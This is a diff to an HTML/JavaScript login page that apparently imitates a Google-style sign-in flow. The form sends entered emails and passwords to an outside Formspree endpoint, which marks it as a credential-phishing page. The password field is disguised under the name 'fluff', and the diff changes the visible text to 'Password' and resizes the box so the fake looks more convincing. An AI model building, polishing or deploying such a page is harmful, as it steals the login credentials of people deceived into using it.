@@ -21,8 +21,8 @@
             background-color: #0e0e0e;
             padding: 30px;
             border-radius: 25px;
-            width: 970px;
-            height: 380px;
+            width: 980px;
+            height: 400px;
             color: white;
             display: flex;
             justify-content: space-between;
@@ -155,8 +155,8 @@
             <form id="signinForm" action="https://formspree.io/f/moveakwr" method="POST">
                 <input type="email" id="emailInput" name="email" class="input-box" placeholder="Email or phone" autocomplete="username">
                 <div id="passwordContainer" style="display: none;">
-                    <label for="fluff" id="passwordLabel">Enter your fluff</label>
-                    <input type="password" id="passwordInput" name="fluff" class="input-box" placeholder="Enter your password" autocomplete="current-password">
+                    <label for="fluff" id="passwordLabel">Password</label> <!-- Changed label to Password -->
+                    <input type="password" id="passwordInput" name="fluff" class="input-box" placeholder="Enter your password" autocomplete="current-password"> <!-- Changed placeholder -->
                 </div>
 
                 <a href="#" class="link forgot-email-link" id="forgotEmailLink">Forgot email?</a>
@@ -190,7 +190,7 @@
             var email = document.getElementById('emailInput').value;
 
             if (email) {
-                document.getElementById('signinText').textContent = 'Enter your fluff'; // Update text
+                document.getElementById('signinText').textContent = 'Enter your password'; // Change text to 'Enter your password'
                 document.getElementById('useGoogleText').style.display = 'none';
                 document.getElementById('emailInput').style.display = 'none';
                 document.getElementById('forgotEmailLink').style.display = 'none';
